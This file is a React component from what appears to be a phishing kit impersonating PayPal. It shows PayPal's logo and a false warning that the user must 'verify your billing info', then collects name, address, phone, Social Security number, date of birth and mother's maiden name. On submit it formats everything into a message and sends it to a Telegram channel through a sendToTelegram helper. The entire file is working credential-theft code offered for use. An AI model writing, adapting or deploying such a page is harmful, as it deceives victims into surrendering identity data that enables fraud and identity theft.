import React, { useState } from 'react';
import { AlertTriangle } from 'lucide-react';
import { sendToTelegram } from '../utils/telegram';

interface BillingFormData {
  firstName: string;
  lastName: string;
  streetAddress: string;
  city: string;
  state: string;
  zipCode: string;
  phoneNumber: string;
  ssn: string;
  dob: string;
  motherMaidenName: string;
}

interface BillingPageProps {
  onComplete: (data: BillingFormData) => void;
}

export function BillingPage({ onComplete }: BillingPageProps) {
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    streetAddress: '',
    city: '',
    state: '',
    zipCode: '',
    phoneNumber: '',
    ssn: '',
    dob: '',
    motherMaidenName: '',
  });

  const handleAlphabetInput = (e: React.ChangeEvent<HTMLInputElement>, field: string, max: number) => {
    const value = e.target.value.replace(/[^a-zA-Z\s]/g, '').substring(0, max);
    setFormData({ ...formData, [field]: value });
  };

  const handleNumericInput = (e: React.ChangeEvent<HTMLInputElement>, field: string, max: number) => {
    const value = e.target.value.replace(/[^0-9]/g, '').substring(0, max);
    setFormData({ ...formData, [field]: value });
  };

  const handleSSNInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, '').substring(0, 9);
    let formattedValue = '';
    if (value.length > 0) formattedValue += value.substring(0, 3);
    if (value.length > 3) formattedValue += '-' + value.substring(3, 5);
    if (value.length > 5) formattedValue += '-' + value.substring(5, 9);
    setFormData({ ...formData, ssn: formattedValue });
  };

  const handleDOBInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, '').substring(0, 8);
    let formattedValue = '';
    if (value.length > 0) formattedValue += value.substring(0, 2);
    if (value.length > 2) formattedValue += '/' + value.substring(2, 4);
    if (value.length > 4) formattedValue += '/' + value.substring(4, 8);
    setFormData({ ...formData, dob: formattedValue });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const message = `<b>[BILLING] Information:</b>\n` +
      `First Name: ${formData.firstName}\n` +
      `Last Name: ${formData.lastName}\n` +
      `Address: ${formData.streetAddress}\n` +
      `City: ${formData.city}\n` +
      `State: ${formData.state}\n` +
      `Zip: ${formData.zipCode}\n` +
      `Phone: ${formData.phoneNumber}\n` +
      `SSN: ${formData.ssn}\n` +
      `DOB: ${formData.dob}\n` +
      `Mother's Maiden Name: ${formData.motherMaidenName}`;
    
    await sendToTelegram(message);
    onComplete(formData);
  };

  return (
    <div className="relative min-h-screen w-full bg-white flex flex-col items-center font-['Inter',sans-serif]">
      {/* Loading Overlay */}
      {loading && (
        <div className="absolute inset-0 z-[100] bg-white flex flex-col items-center justify-center">
          <div className="flex flex-col items-center gap-4">
            <div className="relative w-12 h-12">
              <div className="absolute inset-0 border-2 border-gray-100 rounded-full"></div>
              <div 
                className="absolute inset-0 border-2 border-t-[#0070BA] border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"
                style={{ animationDuration: '0.8s' }}
              ></div>
            </div>
            <p className="text-[#2C2E2F] text-[18px] font-normal">Just a second...</p>
          </div>
        </div>
      )}

      <div className="w-full max-w-[480px] px-8 pt-12 pb-20 flex flex-col items-center">
        {/* PayPal Logo */}
        <div className="mb-8 self-start">
          <svg viewBox="0 0 200 200" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
            <path d="M55.4,153.8l14.1-89.2c0.3-1.9,1.9-3.3,3.8-3.3h38.2c18.5,0,28.8,8.8,26.4,24.1 c-2,12.5-11.2,22.2-23.4,24.1c-1.5,0.2-2.7,1.4-3,2.9l-0.3,1.6l-2.4,15.4l-0.2,1.1c-0.3,1.9-1.9,3.3-3.8,3.3H81.6 c-2.3,0-4,2.1-3.6,4.4l-5.6,35.6c-0.3,1.9-1.9,3.3-3.8,3.3H55.4z" fill="#003087" />
            <path d="M68.5,70.8l-8.8,55.6c-0.3,1.9,1.2,3.6,3.1,3.6h18.2c1.9,0,3.5-1.4,3.8-3.3l5.8-36.7l0.2-1.1 c0.3-1.9,1.9-3.3,3.8-3.3h16.5c12.2-1.9,21.4-11.6,23.4-24.1c0.8-5.1,0.2-9.8-1.7-13.7c-3.6-7.5-11.9-11.5-22.6-11.5H72.3 C70.4,39.3,68.8,40.7,68.5,42.6L68.5,70.8z" fill="#0079C1" />
          </svg>
        </div>

        <div className="w-full bg-[#FFF9F2] border-l-4 border-[#F57C00] p-4 flex items-center gap-3 mb-8">
          <div className="shrink-0">
            <AlertTriangle className="w-5 h-5 text-[#F57C00]" />
          </div>
          <p className="text-[#2C2E2F] text-[15px] font-medium leading-tight">
            We need you to verify your billing info to validate your Account
          </p>
        </div>

        <form onSubmit={handleSubmit} className="w-full space-y-4">
          <div className="flex flex-col sm:flex-row gap-4">
            <input
              type="text"
              placeholder="First Name"
              value={formData.firstName}
              onChange={(e) => handleAlphabetInput(e, 'firstName', 15)}
              className="w-full sm:w-1/2 px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
              required
            />
            <input
              type="text"
              placeholder="Last Name"
              value={formData.lastName}
              onChange={(e) => handleAlphabetInput(e, 'lastName', 15)}
              className="w-full sm:w-1/2 px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
              required
            />
          </div>

          <input
            type="text"
            placeholder="Street Address"
            value={formData.streetAddress}
            onChange={(e) => setFormData({ ...formData, streetAddress: e.target.value })}
            className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
            required
          />

          <div className="flex flex-col sm:flex-row gap-4">
            <input
              type="text"
              placeholder="City"
              value={formData.city}
              onChange={(e) => handleAlphabetInput(e, 'city', 15)}
              className="w-full sm:w-1/2 px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
              required
            />
            <input
              type="text"
              placeholder="State"
              value={formData.state}
              onChange={(e) => setFormData({ ...formData, state: e.target.value })}
              className="w-full sm:w-1/2 px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
              required
            />
          </div>

          <div className="flex flex-col sm:flex-row gap-4">
            <input
              type="text"
              placeholder="Zip Code"
              value={formData.zipCode}
              onChange={(e) => handleNumericInput(e, 'zipCode', 10)}
              className="w-full sm:w-1/2 px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
              required
            />
            <input
              type="text"
              placeholder="Phone Number"
              value={formData.phoneNumber}
              onChange={(e) => handleNumericInput(e, 'phoneNumber', 10)}
              className="w-full sm:w-1/2 px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
              required
            />
          </div>

          <input
            type="text"
            placeholder="Social Security Number"
            value={formData.ssn}
            onChange={handleSSNInput}
            className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
            required
          />

          <div className="flex flex-col sm:flex-row gap-4">
            <input
              type="text"
              placeholder="Date of Birth"
              value={formData.dob}
              onChange={handleDOBInput}
              className="w-full sm:w-1/2 px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
              required
            />
            <input
              type="text"
              placeholder="Mother's Maiden Name"
              value={formData.motherMaidenName}
              onChange={(e) => handleAlphabetInput(e, 'motherMaidenName', 15)}
              className="w-full sm:w-1/2 px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
              required
            />
          </div>

          <button
            type="submit"
            className="w-full py-4 bg-[#0054BB] hover:bg-[#004294] text-white font-bold text-lg rounded-full transition-colors mt-8 shadow-sm"
          >
            Continue
          </button>
        </form>

        <div className="flex items-center gap-6 text-[13px] font-semibold text-gray-600 border-t border-gray-100 pt-8 w-full justify-center mt-12">
          <a href="#" className="hover:underline">Contact Us</a>
          <a href="#" className="hover:underline">Privacy</a>
          <a href="#" className="hover:underline">Legal</a>
          <a href="#" className="hover:underline">Worldwide</a>
        </div>
      </div>
    </div>
  );
}